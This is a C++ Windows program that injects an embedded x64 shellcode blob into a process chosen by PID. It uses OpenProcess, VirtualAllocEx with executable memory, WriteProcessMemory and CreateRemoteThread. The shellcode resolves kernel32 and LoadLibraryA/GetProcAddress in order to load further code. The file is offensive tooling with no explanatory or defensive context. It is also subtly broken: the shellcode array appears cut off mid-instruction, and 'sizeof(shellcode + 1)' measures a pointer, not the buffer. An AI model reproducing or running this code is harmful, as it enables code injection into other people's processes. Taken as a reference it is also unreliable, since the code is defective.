#include "Windows.h"
#include <iostream>
#include <string>

int main()
{
	unsigned char shellcode[] = {0x56,0x48,0x8B,0xF4,0x48,0x83,0xE4,0xF0,0x48,0x83,0xEC,
		0x20,0xE8,0x05,0x00,0x00,0x00,0x48,0x8B,0xE6,0x5E,0xC3,0x48,0x81,0xEC,0xF8,0x00,
		0x00,0x00,0xB8,0x6B,0x00,0x00,0x00,0x66,0x89,0x44,0x24,0x70,0xB8,0x65,0x00,0x00,
		0x00,0x66,0x89,0x44,0x24,0x72,0xB8,0x72,0x00,0x00,0x00,0x66,0x89,0x44,0x24,0x74,
		0xB8,0x6E,0x00,0x00,0x00,0x66,0x89,0x44,0x24,0x76,0xB8,0x65,0x00,0x00,0x00,0x66,
		0x89,0x44,0x24,0x78,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,0x44,0x24,0x7A,0xB8,0x33,
		0x00,0x00,0x00,0x66,0x89,0x44,0x24,0x7C,0xB8,0x32,0x00,0x00,0x00,0x66,0x89,0x44,
		0x24,0x7E,0xB8,0x2E,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x80,0x00,0x00,0x00,0xB8,
		0x64,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x82,0x00,0x00,0x00,0xB8,0x6C,0x00,0x00,
		0x00,0x66,0x89,0x84,0x24,0x84,0x00,0x00,0x00,0xB8,0x6C,0x00,0x00,0x00,0x66,0x89,
		0x84,0x24,0x86,0x00,0x00,0x00,0x33,0xC0,0x66,0x89,0x84,0x24,0x88,0x00,0x00,0x00,
		0x48,0x8D,0x4C,0x24,0x70,0xE8,0x11,0x05,0x00,0x00,0x48,0x89,0x84,0x24,0xB0,0x00,
		0x00,0x00,0x48,0x83,0xBC,0x24,0xB0,0x00,0x00,0x00,0x00,0x75,0x0A,0xB8,0x01,0x00,
		0x00,0x00,0xE9,0xBC,0x02,0x00,0x00,0xC6,0x44,0x24,0x40,0x4C,0xC6,0x44,0x24,0x41,
		0x6F,0xC6,0x44,0x24,0x42,0x61,0xC6,0x44,0x24,0x43,0x64,0xC6,0x44,0x24,0x44,0x4C,
		0xC6,0x44,0x24,0x45,0x69,0xC6,0x44,0x24,0x46,0x62,0xC6,0x44,0x24,0x47,0x72,0xC6,
		0x44,0x24,0x48,0x61,0xC6,0x44,0x24,0x49,0x72,0xC6,0x44,0x24,0x4A,0x79,0xC6,0x44,
		0x24,0x4B,0x41,0xC6,0x44,0x24,0x4C,0x00,0x48,0x8D,0x54,0x24,0x40,0x48,0x8B,0x8C,
		0x24,0xB0,0x00,0x00,0x00,0xE8,0x71,0x02,0x00,0x00,0x48,0x89,0x84,0x24,0xB8,0x00,
		0x00,0x00,0x48,0x83,0xBC,0x24,0xB8,0x00,0x00,0x00,0x00,0x75,0x0A,0xB8,0x02,0x00,
		0x00,0x00,0xE9,0x4C,0x02,0x00,0x00,0xC6,0x44,0x24,0x50,0x47,0xC6,0x44,0x24,0x51,
		0x65,0xC6,0x44,0x24,0x52,0x74,0xC6,0x44,0x24,0x53,0x50,0xC6,0x44,0x24,0x54,0x72,
		0xC6,0x44,0x24,0x55,0x6F,0xC6,0x44,0x24,0x56,0x63,0xC6,0x44,0x24,0x57,0x41,0xC6,
		0x44,0x24,0x58,0x64,0xC6,0x44,0x24,0x59,0x64,0xC6,0x44,0x24,0x5A,0x72,0xC6,0x44,
		0x24,0x5B,0x65,0xC6,0x44,0x24,0x5C,0x73,0xC6,0x44,0x24,0x5D,0x73,0xC6,0x44,0x24,
		0x5E,0x00,0x48,0x8D,0x54,0x24,0x50,0x48,0x8B,0x8C,0x24,0xB0,0x00,0x00,0x00,0xE8,
		0xF7,0x01,0x00,0x00,0x48,0x89,0x84,0x24,0xC0,0x00,0x00,0x00,0x48,0x83,0xBC,0x24,
		0xC0,0x00,0x00,0x00,0x00,0x75,0x0A,0xB8,0x03,0x00,0x00,0x00,0xE9,0xD2,0x01,0x00,
		0x00,0x48,0x8B,0x84,0x24,0xB8,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0xD0,0x00,0x00,
		0x00,0x48,0x8B,0x84,0x24,0xC0,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0xE0,0x00,0x00,
		0x00,0xC6,0x44,0x24,0x20,0x75,0xC6,0x44,0x24,0x21,0x73,0xC6,0x44,0x24,0x22,0x65,
		0xC6,0x44,0x24,0x23,0x72,0xC6,0x44,0x24,0x24,0x33,0xC6,0x44,0x24,0x25,0x32,0xC6,
		0x44,0x24,0x26,0x2E,0xC6};

	std::cout << "Enter PID to inject into\n";
	std::string pid_q;
	std::cin >> pid_q;
	DWORD pid = stoi(pid_q);

	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!processHandle) {
		std::cerr << "Failed to open process.\n";
		return 1;
	}

	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode + 1), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!remoteBuffer) {
		std::cerr << "Failed to allocate memory in the remote process.\n";
		CloseHandle(processHandle);
		return 1;
	}

	if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode + 1), NULL)) {
		std::cerr << "Failed to write shellcode into the remote process.\n";
		VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(processHandle);
		return 1;
	}

	HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (!remoteThread) {
		std::cerr << "Failed to create remote thread.\n";
		VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
		CloseHandle(processHandle);
		return 1;
	}

	WaitForSingleObject(remoteThread, INFINITE);

	CloseHandle(remoteThread);
	VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
	CloseHandle(processHandle);

	std::cout << "Shellcode injected successfully.\n";

	return 0;
}